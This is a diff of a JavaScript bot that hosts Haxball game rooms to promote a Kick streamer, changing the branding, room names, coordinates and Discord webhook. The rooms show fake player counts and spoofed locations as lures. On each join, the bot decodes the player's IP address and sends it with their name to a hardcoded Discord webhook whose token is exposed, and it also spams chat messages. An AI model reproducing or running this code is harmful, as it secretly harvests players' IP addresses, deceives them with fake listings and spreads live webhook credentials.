@@ -29,7 +29,7 @@ async function sendDiscordRaw(webhookUrl, body) {
 async function sendDiscordPlayer(webhookUrl, player, roomName) {
     if (!webhookUrl) return;
     const payload = {
-        content: `Nuevo jugador conectado: **${player.name}** en ${roomName}`,
+        content: `🚀 Nuevo jugador conectado: **${player.name}** en ${roomName}`,
         embeds: [
             {
                 title: "🎯 Nuevo Jugador Conectado",
@@ -42,7 +42,7 @@ async function sendDiscordPlayer(webhookUrl, player, roomName) {
                     { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
                 ],
                 timestamp: new Date().toISOString(),
-                footer: { text: "Teleese x Crash" }
+                footer: { text: "becken82 x TLS" }
             }
         ]
     };
@@ -59,7 +59,7 @@ async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
                 color: 0x0000ff,
                 fields: [{ name: "Link", value: roomLink, inline: false }],
                 timestamp: new Date().toISOString(),
-                footer: { text: "Teleese x Crash" }
+                footer: { text: "becken82 x Crash" }
             }
         ]
     };
@@ -69,25 +69,21 @@ async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
 /* ---------- Config (modificable / rotativo por INDEX) ---------- */
 
 const roomNames = [
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢",
-    "🟢 KICK: JoacoXLS ON 🟢"
+    "💚 KICK: https://kick.com/becken82 ON 💚",
+    "💚 KICK: https://kick.com/becken82 ON 💚",
+    "💚 KICK: https://kick.com/becken82 ON 💚",
+    "💚 KICK: https://kick.com/becken82 ON 💚",
+    "💚 KICK: https://kick.com/becken82 ON 💚"
 ];
 
-const maxPlayersList = [1,1,1,1,1,1,1,1,1,1,1];
-const fakePlayersList = [30,30,30,30,30,30,30,30,30,30,30];
+const maxPlayersList = [1, 1, 1, 1, 1];
+const fakePlayersList = [30, 30, 30, 30, 30];
 
 const geoList = [
-    { lat: -34.5200004577637, lon: -58.4199981689453, flag: "LY" },
-    { lat: -34.5200004577637, lon: -58.4199981689453, flag: "LY" }
+    { lat: -34.5209999084473, lon: -58.4664001464844, flag: "AR" },
+    { lat: -34.6300010681152, lon: -58.3814010620117, flag: "AR" },
+    { lat: -34.5441246032715, lon: -58.4188613891602, flag: "AR" },
+    { lat: -34.5999984741211, lon: -58.3800010681152, flag: "AR" }
 ];
 
 /* ---------- Env / selección por index ---------- */
@@ -95,7 +91,7 @@ const geoList = [
 const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
 const token = process.env.JOB_ID || process.env.HAXBALL_TOKEN || process.env.RECAPTCHA_TOKEN;
 
-const webhookUrl = "https://discord.com/api/webhooks/1393652971170041857/1M6Kx3gxcIQPfMaDCGS6bs52ng8XXfkqY2rR0MoqtY9vrRRHsff1M51lVso7X8bPj6fT";
+const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";
 
 const roomName = roomNames[jobIndex % roomNames.length];
 const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
@@ -140,19 +136,19 @@ Room.create(
             if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
         };
 
-        /* 🔥 SPAM FACHERÍSIMO AL ENTRAR */
+        /* 🔥 Mensajes fachero becken82 al entrar */
         room.onPlayerJoin = (playerObj) => {
             try {
 
                 console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
                 sendDiscordPlayer(webhookUrl, playerObj, roomName);
 
-                // ⚡ Mensajes fachero Kick style
+                // ⚡ Mensajes más visuales
                 const mensajes = [
-                    "🟢🟢🟢  BIENVENIDO REY  🟢🟢🟢",
-                    "💚 MIRÁ EL STREAM DE : https://kick.com/joacoxls 💚",
-                    "🟢 EL MEJOR CONTENIDO EN VIVO 🟢",
-                    "💚 SEGUINOS EN KICK: https://kick.com/joacoxls 💚"
+                    "💚 BIENVENIDO AL REINO DE becken82 💚",
+                    "💛 MIRÁ EL STREAM EN VIVO: https://kick.com/becken82 💛",
+                    "💚 EL MEJOR CONTENIDO EN KICK 💚",
+                    "💛 SEGUINOS Y NO TE PIERDAS NADA 💛"
                 ];
 
                 let i = 0;
